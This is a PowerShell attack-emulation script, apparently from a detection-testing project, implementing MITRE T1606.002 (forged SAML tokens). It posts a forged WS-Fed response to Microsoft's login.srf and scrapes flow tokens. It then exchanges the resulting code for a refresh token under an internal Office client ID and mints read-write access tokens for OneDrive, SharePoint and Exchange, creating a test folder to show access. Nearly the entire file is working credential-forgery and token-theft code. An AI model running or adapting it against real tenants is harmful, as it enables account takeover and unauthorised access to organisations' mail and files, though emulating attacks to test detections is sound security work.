<#
.SYNOPSIS
This part of the attack uses a forged SAML token and starts an interactive session using login.srf for office.com

.DESCRIPTION
TA0006: Credential Access
T1606.002: Forge Web Credentials - SAML Tokens
2nd attack method
#>

# We make use of AADInternals
Get-Module | Where-Object name -eq use-aadtools | Remove-Module -Verbose
Import-Module ../APIs/use-aadtools.psm1
# Environment import tool
Get-Module | Where-Object name -eq readenv | Remove-Module
Import-Module ../APIs/readEnv.psm1
Get-Module | Where-Object name -eq oauth-microsoft | Remove-Module
Import-Module ../APIs/oauth-microsoft.psm1
Get-Module | Where-Object name -eq custom | Remove-Module
Import-Module ../APIs/custom.psm1

Install-HTMLParser

# We use the ews environment variables
Import-Environment "graph.env"
$tenantName = $env:TENANT_ID.Split(".")[0]

$ua = "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:127.0) Gecko/20100101 Firefox/127.0"
$loginMicrosoftOnlineSession = New-Object Microsoft.PowerShell.Commands.WebRequestSession
$officeSession = New-Object Microsoft.PowerShell.Commands.WebRequestSession
$loginMicrosoftOnlineSession.UserAgent = $ua
$officeSession.UserAgent = $ua

# We want to obtain a state ot use in the authorize endpoin. A random state is not possible
$url = "https://www.office.com/login?ru=%2f"
$locationParts = (Invoke-WebRequest $url -WebSession $officeSession -MaximumRedirection 0 -SkipHttpErrorCheck).Headers.Location.Split("&")
$msRndState = ($locationParts | Where-Object { $_ -like 'state=*'}).Split("=", 2)[1]
$msRndNonce = ($locationParts | Where-Object { $_ -like 'nonce=*'}).Split("=", 2)[1]

# We need to obtain a 'flow token' from Microsoft authorize endpoint
$msClientId = "4765445b-32c6-49b0-83e6-1d93765276ca"
$msRedirect = "https://www.office.com/landingv2"
$msRespType = [URI]::EscapeDataString("code id_token")
$msAllScope = [URI]::EscapeDataString("openid profile https://www.office.com/v2/OfficeHome.All")
$msRespMode = "form_post"
$url = "https://login.microsoftonline.com/$($env:TENANT_ID)/oauth2/v2.0/authorize?client_id=$msClientId&redirect_uri=$msRedirect&response_type=$msRespType&scope=$msAllscope&response_mode=$msRespMode&nonce=$msRndNonce&state=$msRndState"
$authorizeResponse = Invoke-RestMethod $url `
  -Method Get `
  -WebSession $loginMicrosoftOnlineSession
$authorizeHtml = ConvertFrom-HTML -Content $authorizeResponse

# The configuration object is stored as a json in a javascript variable $Config
# We make the assumption that the naming of the config object remains constant
$authorizeConfigJs = ($authorizeHtml.SelectNodes("//script") | Where-Object { $_.InnerHtml -like '*$Config={*' })[0].InnerHtml
$authorizeConfigJson = ($authorizeConfigJs.Split("`n") | Where-Object { $_ -like '$Config={*'}).Split("=", 2)[1].TrimEnd(";")
$authorizeConfig = ConvertFrom-Json $authorizeConfigJson

# We need the name of the Flow Token and the Flow Token itself
$flowToken = $authorizeConfig.sFT
$flowTokenName = $authorizeConfig.sFTName
$flowTokenCookieName = $authorizeConfig.sFTCookieName #TODO: Add cookie for return request

# We also need the client context from the same configuration object
$clientContext = $authorizeConfig.sCtx

# Get redirect URL
$url = "https://login.microsoftonline.com/common/GetCredentialType"
$data = @{
  "username" = "svcadfs@detectabil.it";
  "isOtherIdpSupported" = $True;
  "checkPhones" = $False;
  "isRemoteNGCSupported" = $True;
  "isCookieBannerShown" = $False;
  "isFidoSupported" = $True;
  "country" = "NL";
  "forceotclogin" = $False;
  "isExternalFederationDisallowed" = $False;
  "isRemoteConnectSupported" = $False;
  "federationFlags" = 0;
  "isSignup" = $False;
  "isAccessPassSupported" = $True;
  "isQrCodePinSupported" =$True;
  $flowTokenName = $flowToken;
  "originalRequest" = $clientContext;
  };
$data = ConvertTo-Json -Depth 99 $data

$credentialType = Invoke-RestMethod $url `
  -Method Post `
  -WebSession $loginMicrosoftOnlineSession `
  -Body $data

# In Linux multi-line read-hosts are very slow
# Also Read-Host inputs are are limited in length?
$prompt = "WSFed response (from on-premises script)"
Write-Host -NoNewLine ($prompt + ": ")
$wsfResponse = [Console]::ReadLine()

$wsfResponse = [URI]::EscapeDataString($wsfResponse)
$wcTx = [URI]::EscapeDataString("LoginOptions=3&estsredirect=2&estsrequest=$clientContext")

$url = "https://login.microsoftonline.com/login.srf"
$postBody = @"
wa=wsignin1.0&wresult=$wsfResponse&wctx=$wcTx
"@

# We must add a flow token cookie
# This is normally done by Javascript, but since we do not execute this, we have to do this manually
$flowTokenCookie = New-Object System.Net.Cookie
$flowTokenCookie.Name = $flowTokenCookieName
$flowTokenCookie.Value = $flowToken
$flowTokenCookie.Domain = ([Uri]$url).Host
$loginMicrosoftOnlineSession.Cookies.Add($flowTokenCookie)

$loginResponse = Invoke-WebRequest $url `
  -Method Post `
  -ContentType "application/x-www-form-urlencoded" `
  -WebSession $loginMicrosoftOnlineSession `
  -Body $postBody `
  -Verbose

# This response was not meant for scripts
$html = ConvertFrom-HTML -Content $loginResponse.Content

# We assume the form field will always be called 't'
# if this has been changed, we also have to change our submission
# $loginToken = ($html.SelectSingleNode("//input[@name='t']").Attributes | Where-Object { $_.Name -eq 'value' }).Value

# $url = "https://portal.microsoftonline.com?wa=wsignin1.0"
# $postBody = @"
# t=$loginToken
# "@
# $response = Invoke-RestMethod $url `
#   -Method Post `
#   -ContentType "application/x-www-form-urlencoded" `
#   -Headers @{"User-Agent"=$ua} `
#   -Body $postBody

# We extract the code from the response
$officeCode = ($html.SelectSingleNode("//input[@name='code']").Attributes | Where-Object { $_.Name -eq 'value' }).Value
$officeIdToken = ($html.SelectSingleNode("//input[@name='id_token']").Attributes | Where-Object { $_.Name -eq 'value' }).Value
$officeSessionState = ($html.SelectSingleNode("//input[@name='session_state']").Attributes | Where-Object { $_.Name -eq 'value' }).Value
$officeCorrelationId = ($html.SelectSingleNode("//input[@name='correlation_id']").Attributes | Where-Object { $_.Name -eq 'value' }).Value
$officeState = $msRndState

# We must exchange this authorization code for another authorization code which we can use without the client secret
# This is another one of those embedded tokens
$url = "https://www.office.com/landingv2"
$postBody = "code=$officeCode&id_token=$officeIdToken&session_state=$officeSessionState&correlation_id=$officeCorrelationId&state=$officeState"
$officeResponse = Invoke-WebRequest $url `
  -Method Post `
  -ContentType "application/x-www-form-urlencoded" `
  -WebSession $officeSession `
  -MaximumRedirection 2 `
  -SkipHttpErrorCheck `
  -Body $postBody

$html = ConvertFrom-HTML -Content $officeResponse.Content
$authorizationCode = $html.SelectSingleNode("//div[@id='spa-auth-code']")[0].InnerHtml

# Now we use this to obtain a refresh token for Office.com v2
$url = "https://login.microsoftonline.com/$($env:TENANT_ID)/oauth2/v2.0/token"
$postBody = "client_id=$msClientId&code=$authorizationCode&grant_type=authorization_code&scope=$msAllScope%20offline_access"
$response = Invoke-RestMethod $url `
  -Method Post `
  -ContentType "application/x-www-form-urlencoded" `
  -Headers @{"User-Agent"=$ua; "Origin"="https://www.office.com"} `
  -WebSession $loginMicrosoftOnlineSession `
  -Body $postBody

$refreshToken = $response.refresh_token

# With this refresh token we can obtain very privileged access tokens
# the user does not have to authorise these, since the client ID is internal
# we demonstrate this by getting read-write tokens for OneDrive for Business, OWA and SharePoint
$ofbScope = [URI]::EscapeDataString("https://$tenantName-my.sharepoint.com/.default openid profile offline_access")
$RequestBody = "client_id=$msClientId&refresh_token=$refreshToken&grant_type=refresh_token&scope=$ofbScope";
$response = Invoke-RestMethod `
  -Method Post `
  -Uri "https://login.microsoftonline.com/$env:TENANT_ID/oauth2/v2.0/token" `
  -Headers @{"User-Agent"=$ua; "Origin"="https://www.office.com"; "Content-Type" = "application/x-www-form-urlencoded"} `
  -WebSession $loginMicrosoftOnlineSession `
  -Body $RequestBody
$ofbAccessToken = $response.access_token

$spoScope = [URI]::EscapeDataString("https://$tenantName.sharepoint.com/.default openid profile offline_access")
$RequestBody = "client_id=$msClientId&refresh_token=$refreshToken&grant_type=refresh_token&scope=$spoScope";
$response = Invoke-RestMethod `
  -Method Post `
  -Uri "https://login.microsoftonline.com/$env:TENANT_ID/oauth2/v2.0/token" `
  -Headers @{"User-Agent"=$ua; "Origin"="https://www.office.com"; "Content-Type" = "application/x-www-form-urlencoded"} `
  -WebSession $loginMicrosoftOnlineSession `
  -Body $RequestBody
$spoAccessToken = $response.access_token

$excScope = [URI]::EscapeDataString("https://outlook.office.com/.default openid profile offline_access")
$RequestBody = "client_id=$msClientId&refresh_token=$refreshToken&grant_type=refresh_token&scope=$excScope";
$response = Invoke-RestMethod `
  -Method Post `
  -Uri "https://login.microsoftonline.com/$env:TENANT_ID/oauth2/v2.0/token" `
  -Headers @{"User-Agent"=$ua; "Origin"="https://www.office.com"; "Content-Type" = "application/x-www-form-urlencoded"} `
  -WebSession $loginMicrosoftOnlineSession `
  -Body $RequestBody
$excAccessToken = $response.access_token

# With this access material, we can create a folder to demonstrate our readwrite ability
$folderName = "TA0006 - T1606.002 - 2 - $(Get-Random -Minimum 1000 -Maximum 9999)"
$url = "https://$tenantName-my.sharepoint.com/_api/v2.0/drive/root/children"
$newFolder = @{
  "name" = $folderName;
  "folder" = @{};
  "@microsoft.graph.conflictBehavior" = "fail";
}
$newFolder = ConvertTo-Json $newFolder #Pipeline breaks empty array
$response = Invoke-RestMethod $url -Method Post -ContentType "application/json" -Headers @{"Authorization"="Bearer $ofbAccessToken"} -Body $newFolder
$itemId = $response.id
Write-Host $response

# Delete the folder again
Wait-KeyOrTimeOut -Timeout 90000

$url = "https://$tenantName-my.sharepoint.com/_api/v2.0/drive/items/$itemId"
$response = Invoke-RestMethod $url -Method Delete -Headers @{"Authorization"="Bearer $ofbAccessToken"}
